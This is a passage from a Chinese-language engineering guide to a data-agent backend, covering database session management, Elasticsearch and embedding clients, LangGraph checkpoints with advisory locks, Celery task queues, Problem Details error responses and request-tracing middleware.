问题：**引擎持有连接池，应该全局唯一**；每个请求建一个引擎等于每个请求一套池。

### 4.4.2 优化：引擎 + 会话工厂分离

`app/shared/clients/postgres_client_manager.py` 的核心是**一个引擎配一个会话工厂**：

```python
    def init(self) -> None:
        """初始化数据库引擎和会话工厂。"""
        self._engine = create_async_engine(
            self._url,
            echo=False,
            pool_size=10,
            max_overflow=20,
            pool_pre_ping=True,
            pool_recycle=1800,
            pool_timeout=30,
        )
        self._session_maker = async_sessionmaker(
            self._engine,
            class_=AsyncSession,
            expire_on_commit=False,
        )
```

`expire_on_commit=False` 是一个**必须设置**的选项。默认值 `True` 会在提交后把所有 ORM 对象的属性标记为过期，下次访问属性会触发一次隐式的懒加载查询。在异步环境里这会直接抛错（`MissingGreenlet`），因为懒加载是同步的。项目里好几个地方都踩过这个坑，比如元数据仓储里用 `populate_existing=True` 绕过会话缓存：

```python
            # 会话禁用了 expire_on_commit，必须显式刷新才能读到并发写入的最新值
```

`create_all` 由这个方法负责，应用启动时调用：

```python
    async def init_tables(self) -> None:
        """根据当前 ORM 模型创建尚未存在的数据表。"""
        if self._engine is None:
            raise RuntimeError("PostgreSQL 客户端管理器尚未初始化")
        async with self._engine.begin() as connection:
            await connection.run_sync(self._base.metadata.create_all)
```

`run_sync` 是因为 `metadata.create_all` 是同步 API，需要在一个同步回调里执行——SQLAlchemy 用它做线程安全的桥接。

### 4.4.3 两种会话获取方式

```python
    def session(self) -> AsyncSession:
        """创建数据库会话。"""
        return self._get_session_maker()()

    async def get_session(self) -> AsyncIterator[AsyncSession]:
        """获取 FastAPI 请求级数据库会话。"""
        async with self.session() as db_session:
            yield db_session
```

- `session()` 返回裸会话，**由调用方负责 `async with` 或 `begin()`**。后台任务、仓储服务用这个。
- `get_session()` 是**给 FastAPI 依赖注入用的生成器**，请求结束时自动关闭。

### 4.4.4 三个库三个实例

```python
auth_postgres_client_manager = PostgresClientManager(
    cfg.auth_postgresql,
    AuthBase,
)
meta_postgres_client_manager = PostgresClientManager(
    cfg.meta_postgresql,
    MetaBase,
)
assistant_postgres_client_manager = PostgresClientManager(
    cfg.langgraph_postgresql,
    AssistantBase,
)
```

**为什么传 `base`**：`init_tables()` 要靠 `base.metadata` 知道该建哪些表。三个库的表模型继承不同的基类，所以必须一一对应：

```python
"""应用关系型模型的声明基类。"""

from sqlalchemy.orm import DeclarativeBase


class AuthBase(DeclarativeBase):
    """认证与权限 ORM 声明基类。"""


class MetaBase(DeclarativeBase):
    """元数据 ORM 声明基类。"""


class AssistantBase(DeclarativeBase):
    """助手运行数据 ORM 声明基类。"""
```

这样切分带来一个额外好处：**模型定义分散在各模块里，但建表时不冲突**。`identity/models/account.py` 里的 `User` 继承 `AuthBase`，`metadata/models/catalog.py` 里的 `TableInfo` 继承 `MetaBase`，各自进各自的库。

### 4.4.5 事务边界的常见写法

项目里统一用 `async with session.begin()` 显式开事务：

```python
        async with self._repo.session.begin():
            await self._repo.lock_security_mutation()
            user = await self._repo.get_user_by_id_for_update(user_id)
```

注意 `session.begin()` 在没有活动事务时才开始事务，退出时提交（异常时回滚）。**不要在 `begin()` 块里做网络 I/O**——这一点在元数据模块里被明确写成注释（见 6.3）。

## 4.5 Elasticsearch 客户端管理

最简单的一个客户端，因为它不需要连接池配置：

```python
class ESClientManager:
    """Elasticsearch 客户端管理器。"""

    def __init__(self, es_config: ESConfig) -> None:
        """初始化 Elasticsearch 客户端管理器。"""
        self._es_config = es_config
        self._client: AsyncElasticsearch | None = None

    @property
    def _url(self) -> str:
        """获取 Elasticsearch 连接 URL。"""
        return f"http://{self._es_config.host}:{self._es_config.port}"

    def init(self) -> None:
        """初始化 Elasticsearch 客户端。"""
        self._client = AsyncElasticsearch(hosts=[self._url])

    def get_client(self) -> AsyncElasticsearch:
        """获取 Elasticsearch 客户端。"""
        if self._client is None:
            raise RuntimeError("Elasticsearch 客户端管理器尚未初始化")
        return self._client

    async def close(self) -> None:
        """关闭 Elasticsearch 客户端并释放资源。"""
        if self._client is not None:
            await self._client.close()
        self._client = None


es_client_manager = ESClientManager(cfg.elasticsearch)
```

**`AsyncElasticsearch` 内部自带连接池**，所以这里只需要初始化一次。`get_client()` 用「未初始化就抛错」而不是返回 `None`——让错误尽早暴露在调用点，而不是在某个 `.search()` 里变成 `AttributeError`。

索引名也从配置来，四个索引在 YAML 里集中声明：

```yaml
elasticsearch: # 语义检索使用的 Elasticsearch 连接和索引名称。
  host: 127.0.0.1
  port: 9200
  column_index: data-agent-column # 元数据字段语义索引。
  metric_index: data-agent-metric # 指标语义索引。
  value_index: data-agent-value # 字段取值语义索引。
  query_experience_index: data-agent-query-experience # 查询经验语义索引。
  embedding_size: 1024 # 索引向量维度，必须与嵌入模型输出一致。
```

`embedding_size` 是**索引 mapping 的一部分**（`dense_vector` 的 `dims`），改了它必须重建索引。所以配置模型里没有默认值，必须显式填。

## 4.6 Embedding 客户端管理

### 4.6.1 为什么不用 LangChain 的 Embeddings 接口

项目里没有用 `langchain_openai.OpenAIEmbeddings`，而是手写了一个 30 行的客户端。原因是**只需要一个方法**：`aembed_documents(texts) -> list[list[float]]`。用 Protocol 定义契约：

```python
class EmbeddingClient(Protocol):
    """Embedding 客户端协议。"""

    async def aembed_documents(self, texts: list[str]) -> list[list[float]]:
        """生成多个文本的向量。"""
        ...

    async def aclose(self) -> None:
        """关闭 Embedding 客户端。"""
        ...
```

**用 Protocol 而不是继承抽象基类**，是为了让测试和替换实现不需要继承任何东西——只要方法签名对就行。

### 4.6.2 实现

```python
class RemoteEmbeddingClient:
    """OpenAI 兼容的远程 Embedding 客户端。"""

    def __init__(self, config: EmbeddingConfig) -> None:
        """初始化远程 Embedding 客户端。"""
        self._config = config
        self._client = httpx.AsyncClient(
            base_url=config.base_url.rstrip("/"),
            timeout=config.timeout,
            headers=self._build_headers(
                config.api_key.get_secret_value()
                if config.api_key is not None
                else None
            ),
        )

    @staticmethod
    def _build_headers(api_key: str | None) -> dict[str, str]:
        """构建 HTTP 请求头。"""
        headers = {"Content-Type": "application/json"}
        if api_key:
            headers["Authorization"] = f"Bearer {api_key}"
        return headers
```

`api_key` 是可选的（`EmbeddingConfig.api_key` 类型是 `SecretStr | None`），因为有些自建部署不需要鉴权。

请求和解析：

```python
    async def aembed_documents(self, texts: list[str]) -> list[list[float]]:
        """生成多个文本的向量。"""
        if not texts:
            return []
        payload = {
            "model": self._config.model,
            "input": texts,
        }
        response = await self._client.post("/embeddings", json=payload)
        response.raise_for_status()
        return self._parse_embeddings(response.json(), expected_count=len(texts))
```

**空列表直接返回空**，避免发一次无意义的 HTTP 请求。

解析里有三个防御动作：

```python
    @staticmethod
    def _parse_embeddings(
        payload: dict[str, Any], expected_count: int
    ) -> list[list[float]]:
        """解析 Embedding 响应数据。"""
        data = payload.get("data")
        if not isinstance(data, list):
            raise TypeError("Embedding 响应缺失 data 列表")

        embeddings: list[list[float]] = [
            item["embedding"] for item in sorted(data, key=lambda item: item["index"])
        ]

        if len(embeddings) != expected_count:
            raise ValueError(
                f"Embedding 响应数量不匹配: 期望 {expected_count} 条，实际返回 {len(embeddings)} 条"
            )
        return embeddings
```

1. **校验 `data` 是列表**——服务返回错误 JSON 时不要让它变成 `AttributeError`。
2. **按 `index` 排序**——OpenAI 兼容接口**不保证返回顺序与输入顺序一致**，必须按 `index` 重排，否则向量会跟错文本。
3. **校验数量**——数量不匹配说明响应被截断，必须报错而不是「凑合着用」。

第 2 条是最容易被忽略的。向量跟错文本不会报错，只会让检索结果莫名其妙地不准，属于最难排查的一类问题。

## 4.7 LangGraph Checkpoint 与 advisory lock

`app/shared/clients/langgraph_postgres_manager.py` 做了两件事：管 Checkpointer，管 PostgreSQL 咨询锁。

### 4.7.1 两个连接池

```python
    async def init(self) -> None:
        """初始化连接池和 LangGraph Checkpointer。"""
        pool = AsyncConnectionPool[AsyncConnection[DictRow]](
            conninfo=self._conninfo,
            min_size=1,
            max_size=20,
            open=False,
            kwargs={
                "autocommit": True,
                "prepare_threshold": 0,
                "row_factory": dict_row,
            },
        )
        advisory_pool = AsyncConnectionPool[AsyncConnection[DictRow]](
            conninfo=self._conninfo,
            min_size=1,
            max_size=_ADVISORY_POOL_MAX_SIZE,
            open=False,
            kwargs={
                "autocommit": True,
                "prepare_threshold": 0,
                "row_factory": dict_row,
            },
        )
```

**为什么开两个池**：advisory lock 会**长期占住一条连接**（锁绑定连接，必须持到释放）。如果和 Checkpoint 共用池，几个长任务就会把池占满，导致所有会话读写阻塞。分开池之后，锁最多占 12 条（`_ADVISORY_POOL_MAX_SIZE = 12`），Checkpoint 的 20 条不受影响。

三个连接参数也有讲究：

| 参数 | 值 | 原因 |
| --- | --- | --- |
| `autocommit` | True | LangGraph 的 Checkpointer 自己管事务；advisory lock 也需要不在事务里才能长持 |
| `prepare_threshold` | 0 | 禁用预编译语句缓存。**PG 连接池 + 预编译语句组合会有「语句名冲突」问题**（同名 prepared statement 在另一个连接上不存在） |
| `row_factory` | `dict_row` | 查询结果按字典返回，代码里可以写 `row["acquired"]` 而不是 `row[0]` |

初始化失败时**两个池都要关**，否则会漏一个：

```python
        try:
            await pool.open(wait=True)
            await advisory_pool.open(wait=True)
        except Exception:
            await advisory_pool.close()
            await pool.close()
            raise

        checkpointer = AsyncPostgresSaver(pool)
        try:
            await checkpointer.setup()
        except Exception:
            await advisory_pool.close()
            await pool.close()
            raise
```

### 4.7.2 advisory lock 的实现

把业务锁名稳定映射成 PG 的 bigint：

```python
def _advisory_lock_key(name: str) -> int:
    """把业务锁名称稳定映射为 PostgreSQL bigint。"""
    digest = hashlib.sha256(name.encode("utf-8")).digest()
    return int.from_bytes(digest[:8], byteorder="big", signed=True)
```

取哈希前 8 字节当 64 位有符号整数。**这是必需的**：`pg_try_advisory_lock` 只接受 bigint，而业务锁名是字符串。用 sha256 保证同名映射到同一个键、不同名几乎不冲突。

锁的上下文管理器：

```python
    @asynccontextmanager
    async def advisory_lock(
        self,
        name: str,
    ) -> AsyncGenerator[None, None]:
        """非阻塞获取连接级 PostgreSQL advisory lock。"""
        if not name:
            raise ValueError("咨询锁名称不能为空")
        if self._advisory_pool is None:
            raise RuntimeError("LangGraph PostgreSQL 管理器尚未初始化")

        lock_key = _advisory_lock_key(name)
        advisory_pool = self._advisory_pool
        local_lock = self._advisory_locks.setdefault(name, asyncio.Lock())
        if local_lock.locked():
            raise AdvisoryLockBusyError(f"咨询锁正在使用: {name}")
        await local_lock.acquire()
        try:
            async with advisory_pool.connection() as connection:
                # PostgreSQL advisory lock 绑定数据库连接；必须在同一专用连接上持锁
                # 到调用方退出，并在归还连接池前显式解锁。
                cursor = await connection.execute(
                    "SELECT pg_try_advisory_lock(%s) AS acquired",
                    (lock_key,),
                )
                row = await cursor.fetchone()
                if row is None or not bool(row["acquired"]):
                    raise AdvisoryLockBusyError(f"咨询锁正在使用: {name}")
                try:
                    yield
                finally:
                    await connection.execute(
                        "SELECT pg_advisory_unlock(%s)",
                        (lock_key,),
                    )
        finally:
            local_lock.release()
```

**两层锁的原因**：`pg_try_advisory_lock` 是**非阻塞**的（拿不到立刻返回 false），但同一个进程内的多个协程如果用同一个连接池连接去抢同一把锁，PG 层面会认为是同一个连接（advisory lock 可重入），结果是「同一个进程内的两个协程都以为自己拿到了锁」。所以要先加一层进程内的 `asyncio.Lock`，把同进程的竞争挡在外面。

**为什么用 `pg_try_advisory_lock` 而不是 `pg_advisory_lock`**：非阻塞 + 显式报 `AdvisoryLockBusyError`，让上层能把它翻译成「会话正忙，请稍后重试」这样的业务错误（见第 9 章的 `ConversationLifecycleBusyError`）。如果用阻塞版本，请求会静静地挂住，前端只能看到超时。

### 4.7.3 Checkpoint 的清理操作

Checkpoint 表由 `AsyncPostgresSaver.setup()` 建好，有三张表：`checkpoints` / `checkpoint_blobs` / `checkpoint_writes`。项目实现了三个清理粒度：

```python
    async def delete_thread(self, thread_id: str) -> None:
        """删除会话线程的全部 Checkpoint。"""
        await self.get_checkpointer().adelete_thread(thread_id)
```

删除单个 namespace（一个专业 Agent Session）：

```python
    async def delete_checkpoint_namespace(
        self,
        thread_id: str,
        checkpoint_ns: str,
    ) -> bool:
        """原子删除线程内单个 namespace 的全部 Checkpoint 数据。"""
        if not thread_id or not checkpoint_ns:
            raise ValueError("thread_id 和 checkpoint_ns 均不能为空")
        if self._pool is None:
            raise RuntimeError("LangGraph PostgreSQL 管理器尚未初始化")
        deleted = 0
        statements = (
            (
                "DELETE FROM checkpoint_writes "
                "WHERE thread_id = %s AND checkpoint_ns = %s"
            ),
            (
                "DELETE FROM checkpoint_blobs "
                "WHERE thread_id = %s AND checkpoint_ns = %s"
            ),
            ("DELETE FROM checkpoints WHERE thread_id = %s AND checkpoint_ns = %s"),
        )
        async with (
            self._pool.connection() as connection,
            connection.transaction(),
        ):
            for statement in statements:
                cursor = await connection.execute(
                    statement,
                    (thread_id, checkpoint_ns),
                )
                deleted += max(cursor.rowcount, 0)
        return deleted > 0
```

**三条 DELETE 必须在一个事务里**，否则中途失败会留下孤儿记录（`checkpoints` 删了但 `checkpoint_blobs` 还在，占用空间且可能干扰后续读取）。删除顺序也有讲究：先删写入和二进制数据，最后删主表——**反过来会触发外键约束**（如果表之间有外键）。

按用户批量删（用户注销时用）：

```python
    async def delete_user_threads(self, user_id: int) -> None:
        """删除用户全部 LangGraph Checkpoint 线程。"""
        prefix = f"user_{user_id}:conversation_"
```

这里用 `left(thread_id, length(%s)) = %s` 做前缀匹配，配合 `get_thread_id` 生成的命名规范（`user_{id}:conversation_{uuid}`）实现按用户批量定位。

## 4.8 后台任务（Celery）

### 4.8.1 为什么需要它

有三类活儿不能放在 HTTP 请求里做：

| 活儿 | 为什么不能同步做 |
| --- | --- |
| 元数据导入 + 索引同步 | 45 张表要逐张查 Doris 校验、算差量、调 embedding、写 ES，几分钟起步 |
| 会话删除 / 用户注销 | 要跨 PG、Doris、Docker 卷、Checkpoint 清理，失败还要重试 |
| 定时任务（每日取值索引、过期草稿清理） | 没有请求触发，必须定时跑 |

### 4.8.2 应用与队列

`app/shared/tasks/celery_app.py` 定义了应用和四个队列：

```python
celery_app = Celery(
    "dataagent",
    broker=cfg.task_queue.broker_url.get_secret_value(),
    backend=cfg.task_queue.result_backend.get_secret_value(),
    include=[
        "app.assistant.tasks",
        "app.metadata.tasks",
        "app.query.tasks",
        "app.workflows.tasks",
    ],
)
```

`include` 列表的作用是**让 Worker 启动时导入这些模块**，从而注册其中的 `@celery_app.task`。漏一个模块，对应的任务在 Worker 侧就是「未注册」状态，调用时报 `Received unregistered task`。

四个队列按「资源类型」而不是「业务模块」划分：

```python
    task_queues=(
        Queue("default", routing_key="default"),
        Queue("metadata-index", routing_key="metadata-index"),
        Queue("lifecycle", routing_key="lifecycle"),
        Queue("lightweight", routing_key="lightweight"),
    ),
```

| 队列 | 放什么 | 特点 |
| --- | --- | --- |
| `metadata-index` | 元数据导入、字段/指标/取值索引同步、查询经验索引 | 耗时长、可重入、失败重试代价低 |
| `lifecycle` | 会话资源删除、用户注销、过期草稿清理 | 涉及多存储，需要严格顺序 |
| `lightweight` | 会话标题生成 | 一次 LLM 调用，秒级 |
| `default` | 兜底 | 目前未使用 |

路由规则：

```python
    task_routes={
        "dataagent.assistant.generate_conversation_title": {
            "queue": "lightweight",
            "routing_key": "lightweight",
        },
        "dataagent.assistant.*": {
            "queue": "lifecycle",
            "routing_key": "lifecycle",
        },
        "dataagent.metadata.*": {
            "queue": "metadata-index",
            "routing_key": "metadata-index",
        },
        "dataagent.query.*": {
            "queue": "metadata-index",
            "routing_key": "metadata-index",
        },
        "dataagent.workflows.*": {
            "queue": "lifecycle",
            "routing_key": "lifecycle",
        },
    },
```

**顺序很重要**：具体任务名（`generate_conversation_title`）要写在通配规则（`assistant.*`）前面。Celery 按声明顺序匹配，通配在前会把具体规则盖掉。

**为什么把 `query.*` 也放进 `metadata-index`**：查询经验的索引同步和元数据索引同步是同一种工作（调 embedding + 写 ES），放同一队列可以用同一批 Worker 消化，而且它们的失败重试语义一致。

### 4.8.3 任务可靠性配置

```python
celery_app.conf.update(
    accept_content=["json"],
    broker_connection_retry_on_startup=True,
    broker_transport_options={
        "visibility_timeout": TASK_VISIBILITY_TIMEOUT_SECONDS,
    },
    enable_utc=True,
    result_accept_content=["json"],
    result_expires=cfg.task_queue.result_expires_seconds,
    result_serializer="json",
    task_acks_late=True,
    task_create_missing_queues=False,
    task_default_exchange="dataagent",
    task_default_exchange_type="direct",
    task_default_queue="default",
    task_default_routing_key="default",
```

逐条说关键项：

| 配置 | 值 | 为什么 |
| --- | --- | --- |
| `task_acks_late` | True | **任务执行完才 ack**。默认是「收到就 ack」，Worker 崩溃会丢任务；late ack 会在 Worker 崩溃后重新投递 |
| `task_reject_on_worker_lost` | True | Worker 被杀时任务重回队列（配合 late ack） |
| `visibility_timeout` | `task_time_limit + 300` | Redis broker 用可见性超时模拟 ack。**必须大于任务最长执行时间**，否则长任务会被重复投递 |
| `task_time_limit` | 3600 | 硬超时，超了直接杀 |
| `task_soft_time_limit` | 3300 | 软超时，先抛异常给任务自己收尾 |
| `worker_prefetch_multiplier` | 1 | 每个 Worker 进程只预取 1 个任务。**长任务场景必须设 1**，否则一个 Worker 会把队列里的任务全揽走，其它 Worker 闲着 |
| `result_expires` | 86400 | 结果保留 1 天 |
| `enable_utc` + `timezone` | True + Asia/Shanghai | 内部时间用 UTC，定时调度按上海时区 |

`visibility_timeout` 的取值写在文件顶部：

```python
TASK_VISIBILITY_TIMEOUT_SECONDS = cfg.task_queue.task_time_limit_seconds + 300
```

### 4.8.4 定时任务表

```python
celery_app.conf.beat_schedule = {
    "value-index-daily-dispatch": {
        "task": "dataagent.metadata.dispatch_value_indexes",
        "schedule": crontab(
            hour=cfg.task_queue.value_index_sync_time.hour,
            minute=cfg.task_queue.value_index_sync_time.minute,
        ),
    },
    "lifecycle-periodic-dispatch": {
        "task": "dataagent.assistant.cleanup_expired_drafts",
        "schedule": cfg.task_queue.lifecycle_schedule_seconds,
    },
    "user-deletion-recovery": {
        "task": "dataagent.workflows.dispatch_due_user_deletions",
        "schedule": cfg.lifecycle.user_deletion_retry_seconds,
    },
    "query-experience-index-repair": {
        "task": "dataagent.query.repair_indexes",
        "schedule": cfg.task_queue.query_experience_repair_seconds,
    },
}
```

| 任务 | 频率 | 干什么 |
| --- | --- | --- |
| `dispatch_value_indexes` | 每天 `08:00` | 领取到期字段，投递取值索引同步 |
| `cleanup_expired_drafts` | 每 300 秒 | 清理过期草稿和已有墓碑的会话 |
| `dispatch_due_user_deletions` | 每 60 秒 | 领取到期的用户注销任务并投递 |
| `repair_indexes` | 每 300 秒 | 补偿失败/漏掉的查询经验索引同步 |

**这四个任务都是「dispatcher」而不是「干活的人」**——它们只负责领取和投递，真正的工作由另一个任务做。这是为了控制单次执行时间：dispatcher 秒级完成，具体任务可以跑几分钟。同时 dispatcher 用 advisory lock 或 `skip_locked` 保证多实例不会重复领取。

### 4.8.5 在同步任务里跑异步代码

Celery 任务是同步的，但业务代码全是 async。桥接函数只有一个：

```python
def run_async[T](coroutine: Coroutine[Any, Any, T]) -> T:
    """为单个 Celery 任务运行异步领域逻辑。"""
    if sys.platform == "win32":
        # Windows 默认 ProactorEventLoop 不被 psycopg 异步模式支持，显式指定 Selector。
        return asyncio.run(coroutine, loop_factory=asyncio.SelectorEventLoop)
    return asyncio.run(coroutine)
```

和 `main.py` 里的 Windows 处理是同一个原因。**注意这里用 `asyncio.run` 而不是复用已有事件循环**——每个 Celery 任务建一次循环、跑完关掉，任务之间互不干扰。

### 4.8.6 任务的统一写法

所有任务都用同一套装饰器参数：

```python
@celery_app.task(
    name="dataagent.assistant.delete_conversation_resources",
    autoretry_for=(Exception,),
    retry_backoff=True,
    retry_jitter=True,
    max_retries=3,
)
def delete_conversation_resources_task(
    user_id: int,
    conversation_id: str,
) -> dict[str, object]:
    """物理删除会话跨存储资源。"""
```

- `autoretry_for=(Exception,)`：任何异常都重试。
- `retry_backoff=True`：指数退避（1s、2s、4s…）。
- `retry_jitter=True`：加随机抖动，避免多个失败任务同时重试形成尖峰。
- `max_retries=3`：最多 3 次。

**任务函数是薄壳**——只做日志、调 `run_async`、返回结果字典。真正的逻辑在 `async def _xxx()` 里，这样同一段逻辑既能被任务调，也能被测试或其它服务直接 await。

另一个重要约定：**任务里自己创建资源、自己关**，不用 API 进程的全局单例。因为 Worker 是独立进程，全局单例在 Worker 里是另一份。以 `_run_with_lifecycle_service` 为例：

```python
async def _run_with_lifecycle_service[T](
    operation: Callable[[ConversationLifecycleService], Awaitable[T]],
) -> T:
    """初始化会话生命周期资源并执行指定操作。"""
    persistence = LangGraphPostgresManager(cfg.langgraph_postgresql)
    assistant_postgres = PostgresClientManager(
        cfg.langgraph_postgresql,
        AssistantBase,
    )
    meta_postgres = PostgresClientManager(
        cfg.meta_postgresql,
        MetaBase,
    )
    sandbox = create_sandbox_manager(
        cfg.sandbox,
        packaged_skill_readonly_mounts(),
    )
    agents = AgentManager(
        persistence,
        sandbox,
        ConversationTombstoneStore(assistant_postgres),
    )
    service = build_conversation_lifecycle_service(
        persistence,
        assistant_postgres,
        meta_postgres,
        agents,
        sandbox,
        cfg.lifecycle,
    )
    await persistence.init()
    assistant_postgres.init()
    meta_postgres.init()
    await sandbox.init(start_cleanup=False)
    try:
        return await operation(service)
    finally:
        await agents.close()
        await sandbox.disconnect()
        await meta_postgres.close()
        await assistant_postgres.close()
        await persistence.close()
```

注意 `sandbox.init(start_cleanup=False)`——**Worker 进程不跑沙箱空闲清理循环**。清理循环只应该在 API 进程里跑一个，多进程各跑一份会互相干扰。

### 4.8.7 任务提交

提交任务统一走一个小包装：

```python
def _submit(name: str, args: list[object], *, queue: str) -> TaskSubmission:
    """向指定队列提交助手后台任务。"""
    task = celery_app.send_task(
        name,
        args=args,
        queue=queue,
        routing_key=queue,
    )
    submission = TaskSubmission(task_id=task.id)
    logger.info(
        f"助手后台任务已提交: task_id={submission.task_id}, name={name}, queue={queue}"
    )
    return submission
```

返回值是一个只有 `task_id` 的 dataclass：

```python
@dataclass(frozen=True, slots=True)
class TaskSubmission:
    """已提交的 Celery 任务。"""

    task_id: str
```

**为什么要包一层而不是直接用 `task.id`**：上层 API 返回给前端的是 `TaskAcceptedResponse`，前端拿着 `task_id` 去 `GET /api/v1/tasks/{task_id}` 查状态。包一层让「提交任务」这件事有明确的返回类型，也方便日志统一打点。

任务状态查询的实现（`app/identity/api/admin/task_router.py`）：

```python
@router.get("/{task_id}")
async def get_task_status(
    task_id: str,
    _: AdminUserDep,
) -> TaskStatusResponse:
    """查询后台任务状态和结果。"""
    task = AsyncResult(task_id, app=celery_app)
    result = task.result if task.successful() else None
    error = str(task.result) if task.failed() else None
    return TaskStatusResponse(
        task_id=task_id,
        state=task.state,
        ready=task.ready(),
        successful=task.successful() if task.ready() else None,
        result=result,
        error=error,
    )
```

**提交失败时上层怎么处理**——注意调用方的写法，提交失败只记日志不抛错：

```python
        try:
            enqueue_conversation_deletion(user_id, conversation_id)
        except Exception:  # noqa: BLE001
            logger.exception(
                f"提交会话删除任务失败，等待定时补偿: conversation_id={conversation_id}"
            )
```

因为**业务状态已经落库了**（删除墓碑已写），任务只是「尽快执行」的手段。提交失败的话 Beat 的定时任务会把漏掉的任务补上。这个「落库是真相，任务是加速器」的模式在项目里反复出现。

## 4.9 统一错误响应（Problem Details）

### 4.9.1 问题

如果每个模块自己定义错误格式，前端要写一堆 if-else 判断错误类型。而且 `HTTPException` 的默认响应体是 `{"detail": "..."}`，装不下「错误码」「附加字段」「重试建议时间」这些信息。

### 4.9.2 RFC 9457 响应模型

```python
class ProblemDetails(BaseModel):
    """RFC 9457 错误响应协议。"""

    model_config = ConfigDict(extra="allow")

    type: str
    title: str
    status: int
    detail: str | None = None
    instance: str | None = None
```

`extra="allow"` 是必需的——RFC 9457 允许扩展字段，比如限流错误的 `retry_after_seconds` 就要额外带出来。

### 4.9.3 异常基类

```python
class ProblemError(Exception):
    """可由全局处理器转换为 Problem Details 响应的应用异常。"""

    type: str = "internal-server-error"
    title: str = "服务器内部错误"
    status: int = HTTPStatus.INTERNAL_SERVER_ERROR

    def __init__(
        self,
        title: str | None = None,
        *,
        detail: str | None = None,
        type: str | None = None,
        status: int | None = None,
        extensions: Mapping[str, Any] | None = None,
    ) -> None:
        """构造可序列化为 Problem Details 的应用异常。"""
        self.title = title or self.title
        self.detail = detail
        self.extensions = dict(extensions or {})
        if type is not None:
            self.type = type
        if status is not None:
            self.status = status

        super().__init__(detail or self.title)
```

关键设计：**类属性给默认值，构造参数可覆盖**。所以定义一个具体异常只需要三行：

```python
class UserAlreadyExistsError(ProblemError):
    """表示待创建的用户身份已存在。"""

    type = "user-already-exists"
    title = "用户已存在"
    status = HTTPStatus.CONFLICT
```

需要带扩展字段时用 `extensions`：

```python
class RateLimitExceededError(ProblemError):
    """表示认证请求超过允许频率。"""

    type = "rate-limit-exceeded"
    title = "请求过于频繁"
    status = HTTPStatus.TOO_MANY_REQUESTS

    def __init__(
        self,
        *,
        retry_after_seconds: int,
        detail: str | None = None,
    ) -> None:
        """初始化包含建议重试时间的限流错误。"""
        super().__init__(
            detail=detail or "认证请求过于频繁，请稍后重试",
            extensions={"retry_after_seconds": retry_after_seconds},
        )
```

序列化：

```python
    def to_problem(
        self,
        *,
        instance: str | None = None,
    ) -> dict[str, Any]:
        """转换为响应体。"""
        payload: dict[str, Any] = dict(self.extensions)
        payload.update(
            {
                "type": self.type,
                "title": self.title,
                "status": self.status,
            }
        )

        if self.detail is not None:
            payload["detail"] = self.detail
        if instance:
            payload["instance"] = instance
        return payload
```

**扩展字段先铺，标准字段后覆盖**——这样即使扩展字段里误传了 `status`，也会被标准值覆盖，不会破坏协议。

### 4.9.4 OpenAPI 里的声明

`main.py` 里把 422 和默认错误都声明成 `ProblemDetails`：

```python
_PROBLEM_RESPONSE = {
    "model": ProblemDetails,
    "content": {
        "application/problem+json": {
            "schema": {"$ref": "#/components/schemas/ProblemDetails"}
        }
    },
}
_ERROR_RESPONSES = {
    422: {
        **_PROBLEM_RESPONSE,
        "description": "参数校验失败",
    },
    "default": {
        **_PROBLEM_RESPONSE,
        "description": "Problem Details 错误响应",
    },
}
```

这样 `/docs` 里所有接口的错误响应都是统一的 `ProblemDetails` schema，前端可以据此生成类型。

## 4.10 日志与请求追踪

### 4.10.1 问题

多进程 + 异步 + 长任务的环境下，「这条日志属于哪个请求、哪个用户、哪次追踪」很难回答。用普通 logger 打出来的日志是无源的。

### 4.10.2 ContextVar 存追踪上下文

`app/shared/observability/context.py` 一共 8 行：

```python
from contextvars import ContextVar

request_id_ctx: ContextVar[str | None] = ContextVar("request_id", default=None)
trace_id_ctx: ContextVar[str | None] = ContextVar("trace_id", default=None)
client_ip_ctx: ContextVar[str | None] = ContextVar("client_ip", default=None)
method_ctx: ContextVar[str | None] = ContextVar("method", default=None)
path_ctx: ContextVar[str | None] = ContextVar("path", default=None)
user_id_ctx: ContextVar[str | None] = ContextVar("user_id", default=None)
```

**为什么用 `ContextVar` 而不是 `threading.local`**：`threading.local` 在协程里是共享的（多个协程跑在同一个线程），会串数据。`ContextVar` 是 asyncio 原生的上下文隔离机制，每个协程任务有自己的副本。

### 4.10.3 追踪中间件

```python
async def middleware(request: Request, call_next: Callable) -> Response:
    """追踪中间件。"""
    request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
    trace_id = request.headers.get("X-Trace-ID", request_id)
    request_id_token = context.request_id_ctx.set(request_id)
    trace_id_token = context.trace_id_ctx.set(trace_id)
    client_ip_token = context.client_ip_ctx.set(_get_client_ip(request))
    method_token = context.method_ctx.set(request.method)
    path_token = context.path_ctx.set(request.url.path)
    user_id_token = context.user_id_ctx.set(None)
    try:
        response = await call_next(request)
        response.headers["X-Request-ID"] = request_id
        response.headers["X-Trace-ID"] = trace_id
        return response
    finally:
        # ContextVar 值会被下游任务继承；请求结束时必须恢复调用方上下文，避免
        # 测试或替代 ASGI 调度器复用同一任务时把身份和追踪信息带入下一请求。
        context.user_id_ctx.reset(user_id_token)
        context.path_ctx.reset(path_token)
        context.method_ctx.reset(method_token)
        context.client_ip_ctx.reset(client_ip_token)
        context.trace_id_ctx.reset(trace_id_token)
        context.request_id_ctx.reset(request_id_token)
```

三个要点：

1. **入站头优先，没有就生成**。`X-Request-ID` 和 `X-Trace-ID` 从请求头取，所以网关/前端生成的追踪 ID 能贯穿到后端。
2. **响应头回写**，前端可以在网络面板里看到这两个 ID，方便用户报障时对上日志。
3. **`finally` 里逐个 `reset`**。`.set()` 返回的 token 必须用对应的 `.reset(token)` 还原，**不能直接 set 成 None**——因为下游可能已经改了值，直接覆盖会破坏调用方的上下文。注释里写明了原因：ASGI 调度器可能复用同一个任务处理下一个请求，不还原就会串数据。

客户端 IP 的取法有个安全考虑：

```python
def _get_client_ip(request: Request) -> str:
    """获取 IP 地址。"""
    # 转发头只进入日志上下文；认证限流使用 ASGI peer 地址，不能信任客户端自报值。
    if forwarded := request.headers.get("X-Forwarded-For"):
        return forwarded.split(",")[0].strip()
    if request.client:
        return request.client.host
    return "unknown"
```

**`X-Forwarded-For` 只用于日志，不用于限流**。因为它是客户端可以伪造的头。限流用的是 `request.client.host`（ASGI 层的真实 peer 地址）。这个区别在安全上是关键——用可伪造的头做限流等于没做限流。

### 4.10.4 日志格式化

`setup_logger()` 配两个 sink：控制台和 JSONL 文件。

```python
@cache
def setup_logger() -> None:
    """初始化日志配置。"""
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    logger.configure(
        handlers=[
            {
                "sink": sys.stdout,
                "level": cfg.log.level,
                "format": _console_formatter,
                "colorize": True,
                "backtrace": False,
